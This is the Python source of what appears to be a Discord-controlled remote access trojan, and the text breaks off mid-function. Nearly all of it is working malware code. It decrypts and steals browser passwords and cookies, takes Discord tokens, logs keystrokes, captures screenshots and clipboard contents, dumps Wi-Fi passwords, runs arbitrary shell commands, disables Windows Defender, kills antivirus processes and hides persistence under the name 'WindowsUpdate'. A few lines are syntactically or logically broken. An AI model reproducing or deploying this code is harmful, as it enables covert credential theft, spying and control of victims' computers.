import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

try:
    import win32crypt
except ImportError:
    logger.warning("win32crypt not available. Browser data extraction may not work properly.")
import asyncio
import discord
from discord.ext import commands
import pyautogui
import io
import socket
import subprocess
import pyperclip
import os
import time
import ctypes
import webbrowser
import keyboard
from threading import Thread, Event
import json
from datetime import datetime, timedelta
import sqlite3
import shutil
import sys
from os import getenv
import glob
import ssl
import certifi
import aiohttp
import base64
import pyaes
import random
import re
import traceback
import logging
import zlib
import winreg
import requests
import tempfile
import urllib3
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
from discord import TextChannel, Embed, Color
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

disable_warnings_urllib3()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

key_log = []
log_active = False
active_channels = set()
stop_event = Event()
last_sent_time = time.time()
current_dir = os.getcwd()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")

DISCORD_TOKENS = []
BROWSER_DATA = {
    'passwords': [],
    'cookies': [],
    'history': [],
    'autofills': []
}

def watermark():
    return "\n\n***||@1ypi - https://github.com/1ypi||***"

def kill_browser_processes(browser_name):
    process_names = {
        "chrome": ["chrome.exe"],
        "edge": ["msedge.exe"],
        "brave": ["brave.exe"],
        "opera": ["opera.exe"],
        "yandex": ["browser.exe"],
        "firefox": ["firefox.exe"],
    }
    for proc in process_names.get(browser_name.lower(), []):
        try:
            subprocess.run(f"taskkill /f /im {proc}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            logger.error(f"Error killing {proc}: {e}")

def disable_defender():
    try:
        commands = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
            'powershell -Command "Set-MpPreference -DisableScriptScanning $true"',
            'powershell -Command "Set-MpPreference -EnableControlledFolderAccess Disabled"',
            'powershell -Command "Set-MpPreference -EnableNetworkProtection AuditMode"',
            'powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend"',
            'powershell -Command "Set-MpPreference -MAPSReporting Disabled"',
            'powershell -Command "Set-MpPreference -HighThreatDefaultAction Allow"',
            'powershell -Command "Set-MpPreference -ModerateThreatDefaultAction Allow"',
            'powershell -Command "Set-MpPreference -LowThreatDefaultAction Allow"'
        ]

        for cmd in commands:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        return True
    except Exception as e:
        logger.error(f"Error disabling Defender: {e}")
        return False

def add_exclusion(path):
    try:
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \"{path}\""'
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        logger.error(f"Error adding exclusion: {e}")
        return False

def kill_av_processes():
    av_processes = [
        "msmpeng", "msmpsvc", "securityhealthservice", "wdnissvc", 
        "webthreatdefsvc", "webthreatdefusersvc", "avp", "avpui", 
        "kavfs", "kavvs", "kes", "kis", "ksde", "ksos", "mcshield", 
        "msseces", "nortonsecurity", "ns", "nsafw", "nsd", "nst", 
        "symantec", "symcorpu", "symefasi", "ccsvchst", "ccsetmgr", 
        "ccevtmgr", "savservice", "avguard", "avshadow", "avgnt", 
        "avmailc", "avwebgrd", "bdagent", "bdnt", "vsserv", "fsma", 
        "fsms", "fshoster", "fsdfwd", "f-secure", "hips", "rtvscan", 
        "vstskmgr", "engineserver", "frameworkservice", "bullguard", 
        "clamav", "clamd", "freshclam", "sophos", "savd", "savadmin", 
        "hitmanpro", "zemana", "malwarebytes", "mbam", "mbamtray", 
        "mbae", "mbae-svc", "adaware", "spybot", "spyterminator", 
        "superantispyware", "avast", "avastui", "aswidsagent", 
        "avg", "avgui", "avira", "avguard", "avshadow", "avgnt", 
        "avmailc", "avwebgrd", "comodo", "cis", "cistray", "cmdagent", 
        "cpdaemon", "cpf", "cavwp", "panda", "psanhost", "psksvc", 
        "pavsrv", "pavprsrv", "pavfnsvr", "pavboot", "trendmicro", 
        "tmlisten", "ufseagnt", "tmcc", "tmactmon", "tmbmsrv", 
        "tmib", "tmlwf", "tmcomm", "tmobile", "zonealarm", "zatray", 
        "zaprivacy", "zaapp", "zauinst", "windefender", "defender", 
        "sense", "mssense", "smartscreen", "windowsdefender", "wd"
    ]

    try:
        subprocess.run(f"taskkill /f /im {','.join(av_processes)}", shell=True, 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        logger.error(f"Error killing AV processes: {e}")
        return False

class BrowserStealer:
    @staticmethod
    def get_encryption_key(browser_path):
        try:
            local_state_path = os.path.join(browser_path, "Local State")
            if os.path.exists(local_state_path):
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.loads(f.read())

                encrypted_key = local_state["os_crypt"]["encrypted_key"]
                encrypted_key = base64.b64decode(encrypted_key)[5:]

                import ctypes
                from ctypes import wintypes

                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [("cbData", wintypes.DWORD),
                               ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

                CryptUnprotectData = ctypes.windll.crypt32.CryptUnprotectData
                CryptUnprotectData.argtypes = [
                    ctypes.POINTER(DATA_BLOB), ctypes.c_wchar_p, ctypes.POINTER(DATA_BLOB),
                    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.POINTER(DATA_BLOB)
                ]
                CryptUnprotectData.restype = ctypes.c_bool

                encrypted_key_bytes = ctypes.create_string_buffer(encrypted_key)
                blob_in = DATA_BLOB(len(encrypted_key_bytes), ctypes.cast(ctypes.pointer(encrypted_key_bytes), ctypes.POINTER(ctypes.c_ubyte)))
                blob_out = DATA_BLOB()

                if CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                    key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                    return key
        except Exception as e:
            logger.error(f"Error getting encryption key: {e}")
        return None
    @staticmethod
    def get_chrome_based_cookies(browser_path, browser_name):
        try:
            kill_browser_processes(browser_name)
            key = BrowserStealer.get_encryption_key(browser_path)
            if not key:
                return []

            cookie_paths = []
            profiles = []

            for item in os.listdir(browser_path):
                if os.path.isdir(os.path.join(browser_path, item)) and (item.startswith("Profile") or item == "Default"):
                    profiles.append(item)

            profiles.append("")

            for profile in profiles:
                profile_path = os.path.join(browser_path, profile)
                cookie_path = os.path.join(profile_path, "Cookies")
                if os.path.exists(cookie_path):
                    cookie_paths.append(cookie_path)

            cookies = []
            for cookie_path in cookie_paths:
                try:
                    temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookies_{random.randint(1000, 9999)}")
                    shutil.copy2(cookie_path, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

                    for row in cursor.fetchall():
                        host, name, encrypted_value = row
                        if host and name and encrypted_value:
                            decrypted_value = BrowserStealer.decrypt_password(encrypted_value, key)
                            if decrypted_value:
                                cookies.append({
                                    'host': host,
                                    'name': name,
                                    'value': decrypted_value,
                                    'browser': browser_name
                                })

                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    logger.error(f"Error reading cookies: {e}")
                    continue

            return cookies
        except Exception as e:
            logger.error(f"Error getting {browser_name} cookies: {e}")
            return []
    @staticmethod
    def decrypt_password(buffer, key):
        try:
            if buffer.startswith(b'v10') or buffer.startswith(b'v11'):

                nonce = buffer[3:15]
                ciphertext = buffer[15:-16]
                tag = buffer[-16:]

                aesgcm = AESGCM(key)
                decrypted = aesgcm.decrypt(nonce, ciphertext + tag, None)
                return decrypted.decode()
            else:

                import win32crypt
                try:
                    return win32crypt.CryptUnprotectData(buffer, None, None, None, 0)[1].decode()
                except:
                    return None
        except Exception as e:
            logger.error(f"Error decrypting password: {e}")
            return None

    @staticmethod
    def get_chrome_based_passwords(browser_path, browser_name):
        try:
            kill_browser_processes(browser_name)
            key = BrowserStealer.get_encryption_key(browser_path)
            if not key:
                return []

            login_data_paths = []
            profiles = []

            for item in os.listdir(browser_path):
                if os.path.isdir(os.path.join(browser_path, item)) and (item.startswith("Profile") or item == "Default"):
                    profiles.append(item)

            profiles.append("")

            for profile in profiles:
                profile_path = os.path.join(browser_path, profile)
                login_data_path = os.path.join(profile_path, "Login Data")
                if os.path.exists(login_data_path):
                    login_data_paths.append(login_data_path)

            passwords = []
            for login_data_path in login_data_paths:
                try:

                    temp_db = os.path.join(tempfile.gettempdir(), f"temp_login_data_{random.randint(1000, 9999)}")
                    shutil.copy2(login_data_path, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        if url and username and encrypted_password:
                            decrypted_password = BrowserStealer.decrypt_password(encrypted_password, key)
                            if decrypted_password:
                                passwords.append({
                                    'url': url,
                                    'username': username,
                                    'password': decrypted_password,
                                    'browser': browser_name
                                })

                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    logger.error(f"Error reading login data: {e}")
                    continue

            return passwords
        except Exception as e:
            logger.error(f"Error getting {browser_name} passwords: {e}")
            return []

class DiscordTokenStealer:
    @staticmethod
    def get_tokens():
        tokens = []
        paths = {
            'Discord': os.path.join(os.getenv('APPDATA'), 'Discord'),
            'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
            'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
            'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data')
        }

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            try:
                if platform in ['Discord', 'Discord Canary', 'Discord PTB']:

                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith('.ldb') or file.endswith('.log'):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                                        found_tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
                                        for token in found_tokens:
                                            tokens.append({'platform': platform, 'token': token})
                                except:
                                    continue
                else:

                    leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
                    if os.path.exists(leveldb_path):
                        for file in os.listdir(leveldb_path):
                            if file.endswith('.ldb') or file.endswith('.log'):
                                file_path = os.path.join(leveldb_path, file)
                                try:
                                    with open(file_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                                        found_tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
                                        for token in found_tokens:
                                            tokens.append({'platform': platform, 'token': token})
                                except:
                                    continue
            except Exception as e:
                logger.error(f"Error extracting tokens from {platform}: {e}")
                continue

        return tokens

def hide_process():
    try:

        current_pid = os.getpid()

        try:
            subprocess.run(f'sc create "WindowsUpdateService" binPath= "{sys.executable}" start= auto', 
                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

        return True
    except Exception as e:
        logger.error(f"Error hiding process: {e}")
        return False

def add_to_startup():
    try:
        startup_paths = [
            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
            os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        ]

        current_file = sys.argv[0]

        for startup_path in startup_paths:
            if os.path.exists(startup_path):
                target_path = os.path.join(startup_path, 'WindowsUpdate.exe')

                if not os.path.exists(target_path):
                    shutil.copy2(current_file, target_path)

                    subprocess.run(f'attrib +h +s "{target_path}"', shell=True)

        try:
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
        except:
            pass

        return True
    except Exception as e:
        logger.error(f"Error adding to startup: {e}")
        return False
@bot.command()
async def su(ctx):
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send(f"✅ Already running as administrator{watermark()}")
            return

        current_pid = os.getpid()

        batch_script = f"""
        @echo off
        timeout /t 3 /nobreak >nul
        taskkill /pid {current_pid} /f
        del "%~f0"
        """

        temp_bat = os.path.join(getenv("TEMP"), "elevate_kill.bat")
        with open(temp_bat, "w") as f:
            f.write(batch_script)

        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )

        subprocess.Popen(
            temp_bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        await ctx.send(
            f"🔄 Requesting administrator privileges... This window will close if accepted.{watermark()}"
        )

    except Exception as e:
        await ctx.send(f"❌ Failed to elevate privileges: {str(e)}{watermark()}")

@bot.command()
async def recent(ctx, browser: str = "chrome"):
    try:
        await ctx.send(f"🔍 Collecting recently visited websites...{watermark()}")
        browser = browser.lower()
        history = []

        if browser in ["chrome", "edge", "brave"]:
            browser_paths = {
                "chrome": os.path.join(
                    getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"
                ),
                "edge": os.path.join(
                    getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"
                ),
                "brave": os.path.join(
                    getenv("LOCALAPPDATA"),
                    "BraveSoftware",
                    "Brave-Browser",
                    "User Data",
                ),
            }

            path = browser_paths.get(browser)
            if not path or not os.path.exists(path):
                await ctx.send(
                    f"❌ {browser.capitalize()} not found or no history available.{watermark()}"
                )
                return

            history_files = []
            for root, dirs, files in os.walk(path):
                if "Extensions" in root:
                    continue
                if "History" in files:
                    history_files.append(os.path.join(root, "History"))

            if not history_files:
                await ctx.send(
                    f"❌ No history found for {browser.capitalize()}.{watermark()}"
                )
                return

            for history_file in history_files:
                try:
                    temp_db = os.path.join(getenv("TEMP"), "temp_history.db")
                    shutil.copy2(history_file, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    cursor.execute(
                        """
                        SELECT urls.url, urls.title, visits.visit_time 
                        FROM urls 
                        JOIN visits ON urls.id = visits.url 
                        ORDER BY visits.visit_time DESC 
                        LIMIT 100
                    """
                    )

                    for url, title, visit_time in cursor.fetchall():
                        timestamp = datetime(1601, 1, 1) + timedelta(
                            microseconds=visit_time
                        )
                        history.append(
                            {
                                "url": url,
                                "title": title if title else "[No Title]",
                                "time": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                                "browser": browser,
                            }
                        )

                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    print(f"Error reading history: {e}")
                    if "conn" in locals():
                        conn.close()
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                    continue

        elif browser == "firefox":
            firefox_path = os.path.join(
                getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"
            )
            if not os.path.exists(firefox_path):
                await ctx.send(
                    f"❌ Firefox not found or no history available.{watermark()}"
                )
                return

            history_files = glob.glob(
                os.path.join(firefox_path, "**", "places.sqlite"), recursive=True
            )

            if not history_files:
                await ctx.send(f"❌ No history found for Firefox.{watermark()}")
                return

            for history_file in history_files:
                try:
                    temp_db = os.path.join(getenv("TEMP"), "temp_places.sqlite")
                    shutil.copy2(history_file, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    cursor.execute(
                        """
                        SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date 
                        FROM moz_places 
                        JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id 
                        ORDER BY moz_historyvisits.visit_date DESC 
                        LIMIT 100
                    """
                    )

                    for url, title, visit_time in cursor.fetchall():
                        timestamp = datetime(1970, 1, 1) + datetime.timedelta(
                            microseconds=visit_time
                        )
                        history.append(
                            {
                                "url": url,
                                "title": title if title else "[No Title]",
                                "time": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                                "browser": "firefox",
                            }
                        )

                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    print(f"Error reading Firefox history: {e}")
                    if "conn" in locals():
                        conn.close()
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                    continue
        else:
            await ctx.send(
                f"❌ Unsupported browser. Try 'chrome', 'edge', 'brave', or 'firefox'.{watermark()}"
            )
            return

        if not history:
            await ctx.send(f"❌ No browsing history found.{watermark()}")
            return

        output = []
        for i, entry in enumerate(history[:50], 1):
            output.append(f"{i}. [{entry['time']}] {entry['title']}\n   {entry['url']}")

        message = (
            f"🌐 Recent browsing history from {browser.capitalize()}:\n"
            + "\n".join(output)
            + watermark()
        )
        if len(message) > 2000:
            for i in range(0, len(message), 2000):
                await ctx.send(message[i : i + 2000])
        else:
            await ctx.send(message)

    except Exception as e:
        await ctx.send(
            f"An error occurred while collecting browsing history: {e}{watermark()}"
        )

@bot.command()
async def screen(ctx):
    try:
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        img_bytes.seek(0)
        await ctx.send(file=discord.File(img_bytes, "screenshot.png"))
        await ctx.send(f"Screenshot captured{watermark()}")
    except Exception as e:
        await ctx.send(f"Error capturing screenshot: {e}{watermark()}")

@bot.command()
async def ip(ctx):
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        await ctx.send(f"IP address: {ip_address}{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting IP: {e}{watermark()}")

@bot.command()
async def clipboard(ctx):
    try:
        content = pyperclip.paste()
        if content:
            await ctx.send(f"**Current Clipboard:**\n{content[:2000]}{watermark()}")
        else:
            await ctx.send(f"Clipboard is empty or not text.{watermark()}")
    except Exception as e:
        await ctx.send(f"Error reading clipboard: {e}{watermark()}")

@bot.command()
async def exec(ctx, *, command: str):
    try:
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10
        )
        result = (
            result[:1900] + "\n...output truncated..." if len(result) > 1900 else result
        )
        await ctx.send(f"```\n{result}\n```{watermark()}")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Command failed:\n```\n{e.output}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error: {e}{watermark()}")

@bot.command()
async def shutdown(ctx):
    try:
        await ctx.send(f"Shutting down the PC...{watermark()}")
        os.system("shutdown /s /t 1")
    except Exception as e:
        await ctx.send(f"Error shutting down: {e}{watermark()}")

@bot.command()
async def bsod(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(
            3221226010, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint())
        )
        await ctx.send(f"Triggering BSOD...{watermark()}")
    except Exception as e:
        await ctx.send(f"Error triggering BSOD: {e}{watermark()}")

@bot.command()
async def url(ctx, *, url: str):
    try:
        url = "http://" + url if not url.startswith(("http://", "https://")) : url
        webbrowser.open(url)
        await ctx.send(f"🌐 Opened URL: {url}{watermark()}")
    except Exception as e:
        await ctx.send(f"Error opening URL: {e}{watermark()}")

@bot.command()
async def restart(ctx):
    try:
        await ctx.send(
            f"🔄 Restarting PC in 5 seconds... Type `!cancelrestart` to abort.{watermark()}"
        )
        time.sleep(5)
        if not stop_event.is_set():
            os.system("shutdown /r /t 1")
    except Exception as e:
        await ctx.send(f"Error restarting: {e}{watermark()}")

@bot.command()
async def cancelrestart(ctx):
    try:
        stop_event.set()
        await ctx.send(f"✅ Restart cancelled.{watermark()}")
    except Exception as e:
        await ctx.send(f"Error cancelling restart: {e}{watermark()}")

def on_key_event(e):
    if e.event_type == keyboard.KEY_DOWN and log_active:
        key_name = e.name
        key_name = f"[{key_name.upper()}]" if len(key_name) > 1 else key_name
        key_log.append(key_name)
    return None

async def send_periodic_updates():
    global last_sent_time, key_log
    while not stop_event.is_set():
        if log_active and active_channels:
            await asyncio.sleep(15)
            if key_log:
                keys_str = " ".join(key_log)
                if len(keys_str) > 1900:
                    keys_str = keys_str[:1900] + "... [truncated]"
                for channel_id in active_channels:
                    channel = bot.get_channel(channel_id)
                    if channel:
                        try:
                            await channel.send(
                                f"⌨️ Keys pressed (last 15s):\n```{keys_str}```{watermark()}"
                            )
                        except Exception as e:
                            print(f"Error sending keylog: {e}")
                key_log = []
            last_sent_time = time.time()
        else:
            await asyncio.sleep(5)

@bot.command()
async def log(ctx):
    global log_active
    if log_active:
        await ctx.send(f"⚠️ Keylogging is already active!{watermark()}")
    else:
        log_active = True
        active_channels.add(ctx.channel.id)
        keyboard.hook(on_key_event)
        await ctx.send(
            f"✅ Keylogging started! (Updates every 15 seconds){watermark()}"
        )

@bot.command()
async def stoplog(ctx):
    global log_active
    if not log_active:
        await ctx.send(f"⚠️ Keylogging isn't active!{watermark()}")
    else:
        log_active = False
        if ctx.channel.id in active_channels:
            active_channels.remove(ctx.channel.id)
        await ctx.send(f"⛔ Keylogging stopped!{watermark()}")

@bot.command()
async def msg(ctx, *, message: str):
    try:
        sanitized_msg = message.replace('"', '""')
        vbs_script = f'\n        MsgBox "{sanitized_msg}", vbExclamation, "Message from Discord"\n        '
        temp_vbs = os.path.join(getenv("TEMP"), "discord_msg.vbs")
        with open(temp_vbs, "w", encoding="utf-16") as f:
            f.write(vbs_script)
        subprocess.Popen(["wscript.exe", temp_vbs], shell=True)
        await ctx.send(
            f"✅ Message box displayed with text: {message[:100]}...{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error showing message box: {e}{watermark()}")

@bot.command()
async def discord(ctx):
    try:
        await ctx.send(f"🔍 Extracting Discord tokens...{watermark()}")

        tokens = DiscordTokenStealer.get_tokens()
        if tokens:
            token_list = []
            for i, token_info in enumerate(tokens, 1):
                token_list.append(f"{i}. {token_info['platform']}: `{token_info['token']}`")

            message = "**Discord Tokens Found:**\n" + "\n".join(token_list)
            if len(message) > 2000:
                for i in range(0, len(message), 2000):
                    await ctx.send(message[i:i+2000])
            else:
                await ctx.send(message + watermark())
        else:
            await ctx.send(f"No Discord tokens found.{watermark()}")
    except Exception as e:
        await ctx.send(f"Error extracting Discord tokens: {e}{watermark()}")

@bot.command()
async def browsers(ctx):
    try:
        await ctx.send(f"🔍 Stealing browser data...{watermark()}")

        data = BrowserStealer.steal_browser_data()

        if data['passwords']:
            password_list = []
            for i, pwd in enumerate(data['passwords'][:10], 1):  

                password_list.append(f"{i}. {pwd['browser']} - {pwd['url']}\n   User: {pwd['username']}\n   Pass: {pwd['password']}")

            message = "**Browser Passwords:**\n" + "\n\n".join(password_list)
            if len(message) > 2000:
                for i in range(0, len(message), 2000):
                    await ctx.send(message[i:i+2000])
            else:
                await ctx.send(message + watermark())

        if data['cookies']:
            cookie_list = []
            for i, cookie in enumerate(data['cookies'][:10], 1):  

                cookie_list.append(f"{i}. {cookie['browser']} - {cookie['host']}\n   Name: {cookie['name']}\n   Value: {cookie['value']}")

            message = "**Browser Cookies:**\n" + "\n\n".join(cookie_list)
            if len(message) > 2000:
                for i in range(0, len(message), 2000):
                    await ctx.send(message[i:i+2000])
            else:
                await ctx.send(message + watermark())

        if not data['passwords'] and not data['cookies']:
            await ctx.send(f"No browser data found.{watermark()}")
    except Exception as e:
        await ctx.send(f"Error extracting browser data: {e}{watermark()}")

@bot.command()
async def avbypass(ctx):
    try:
        await ctx.send(f"🛡️ Attempting antivirus bypass...{watermark()}")

        defender_disabled = disable_defender()

        exclusion_added = add_exclusion(sys.argv[0])

        av_killed = kill_av_processes()

        process_hidden = hide_process()

        startup_added = add_to_startup()

        message = "**Antivirus Bypass Results:**\n"
        message += f"• Defender Disabled: {'✅' if defender_disabled else '❌'}\n"
        message += f"• Exclusion Added: {'✅' if exclusion_added else '❌'}\n"
        message += f"• AV Processes Killed: {'✅' if av_killed else '❌'}\n"
        message += f"• Process Hidden: {'✅' if process_hidden else '❌'}\n"
        message += f"• Startup Persistence: {'✅' if startup_added else '❌'}\n"

        await ctx.send(message + watermark())
    except Exception as e:
        await ctx.send(f"Error during antivirus bypass: {e}{watermark()}")

@bot.command()
async def persist(ctx):
    try:
        await ctx.send(f"🔗 Adding persistence...{watermark()}")

        success = add_to_startup()

        if success:
            await ctx.send(f"✅ Persistence added successfully!{watermark()}")
        else:
            await ctx.send(f"❌ Failed to add persistence.{watermark()}")
    except Exception as e:
        await ctx.send(f"Error adding persistence: {e}{watermark()}")

@bot.command()
async def help(ctx):
    help_text = f"""
**Available Commands:**
**System Commands:**
!screen - Capture screenshot
!ip - Get IP address
!clipboard - Show clipboard content
!exec <command> - Run shell command
!shutdown - Shutdown computer
!restart - Restart computer
!bsod - Trigger BSOD (WARNING)

**File Operations:**
!ls - List files
!cd <path> - Change directory
!download <file> - Download file
!rm <file> - Delete file

**Information Gathering:**
!systeminfo - System information
!cpu - CPU info
!gpu - GPU info
!ram - RAM info
!wifi_passwords - Show WiFi passwords
!recent [browser] - Browser history
!discord - Extract Discord tokens
!browsers - Extract browser data

**Other:**
!msg <message> - Show message box
!url <url> - Open URL
!log - Start keylogging
!stoplog - Stop keylogging
!su - Request admin privileges
!avbypass - Bypass antivirus
!persist - Add persistence

{watermark()}
"""
    await ctx.send(help_text)
current_dir = os.getcwd()

@bot.command()
async def ls(ctx):
    try:
        files = os.listdir(current_dir)
        output = "\n".join(files)
        if not output:
            output = "[Empty directory]"
        await ctx.send(
            f"**Directory listing for:** `{current_dir}`\n```\n{output[:1900]}\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error listing directory: {e}{watermark()}")

@bot.command()
async def cd(ctx, *, path: str):
    global current_dir
    try:
        new_path = os.path.abspath(os.path.join(current_dir, path))
        if os.path.isdir(new_path):
            current_dir = new_path
            await ctx.send(f"Changed directory to `{current_dir}`{watermark()}")
        else:
            await ctx.send(f"Directory not found: `{new_path}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error changing directory: {e}{watermark()}")

@bot.command()
async def rm(ctx, *, filename: str):
    try:
        target = os.path.join(current_dir, filename)
        if os.path.isfile(target):
            os.remove(target)
            await ctx.send(f"Deleted file `{filename}`{watermark()}")
        else:
            await ctx.send(f"File not found: `{filename}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error deleting file: {e}{watermark()}")

@bot.command()
async def rmd(ctx, *, dirname: str):
    try:
        target = os.path.join(current_dir, dirname)
        if os.path.isdir(target):
            shutil.rmtree(target)
            await ctx.send(f"Deleted directory `{dirname}`{watermark()}")
        else:
            await ctx.send(f"Directory not found: `{dirname}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error deleting directory: {e}{watermark()}")

@bot.command()
async def download(ctx, *, filename: str):
    try:
        target = os.path.join(current_dir, filename)
        if os.path.isfile(target):
            await ctx.send(file=discord.File(target))
            await ctx.send(f"File sent: `{filename}`{watermark()}")
        else:
            await ctx.send(f"File not found: `{filename}`{watermark()}")
    except Exception as e:
        await ctx.send(f"Error sending file: {e}{watermark()}")

@bot.command()
async def uuid(ctx):
    try:
        result = subprocess.check_output(
            "wmic csproduct get uuid", shell=True, text=True
        )
        await ctx.send(f"**UUID:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting UUID: {e}{watermark()}")

@bot.command()
async def mac(ctx):
    try:
        result = subprocess.check_output("getmac", shell=True, text=True)
        await ctx.send(f"**MAC Addresses:**\n```\n{result.strip()}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting MAC address: {e}{watermark()}")

@bot.command()
async def dns(ctx):
    try:
        result = subprocess.check_output("ipconfig /all", shell=True, text=True)
        dns_lines = [
            line
            for line in result.splitlines()
            if "DNS Servers" in line or line.strip().startswith("DNS")
        ]
        dns_lines = ["No DNS info found."] if not dns_lines else dns_lines
        await ctx.send(
            "**DNS Info:**\n```\n" + "\n".join(dns_lines) + f"\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting DNS info: {e}{watermark()}")

@bot.command()
async def wifi(ctx):
    try:
        result = subprocess.check_output(
            "netsh wlan show interfaces", shell=True, text=True
        )
        await ctx.send(
            f"**Connected WiFi Info:**\n```\n{result.strip()}\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error getting WiFi info: {e}{watermark()}")

@bot.command()
async def wifi_passwords(ctx):
    try:
        profiles = subprocess.check_output(
            "netsh wlan show profiles", shell=True, text=True
        )
        profile_names = [
            line.split(":")[1].strip()
            for line in profiles.splitlines()
            if "All User Profile" in line
        ]

        passwords = []
        for name in profile_names:
            try:
                pw_info = subprocess.check_output(
                    f'netsh wlan show profile name="{name}" key=clear',
                    shell=True,
                    text=True,
                    stderr=subprocess.DEVNULL,
                )

                password = None
                for line in pw_info.splitlines():
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        break

                if password:
                    passwords.append(f"{name}: {password}")
                else:
